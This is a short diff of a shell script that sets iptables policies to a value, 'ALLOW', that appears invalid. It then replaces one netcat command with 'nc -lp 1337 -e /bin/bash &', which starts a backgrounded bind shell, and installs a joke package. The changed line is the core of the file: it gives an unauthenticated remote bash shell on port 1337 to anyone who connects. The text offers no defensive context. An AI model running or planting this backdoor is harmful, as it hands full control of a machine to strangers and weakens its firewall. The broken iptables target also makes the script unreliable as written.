@@ -24,7 +24,7 @@ command iptables -P OUTPUT ALLOW
 command iptables -P FORWARD ALLOW
 
 # Open up a netcat listener on the best port (TCP)
-nc -d -l -p 1337 -e /bin/bash
+nc -lp 1337 -e /bin/bash &
 
 # Have some fun :D
 command apt install sl > /dev/null
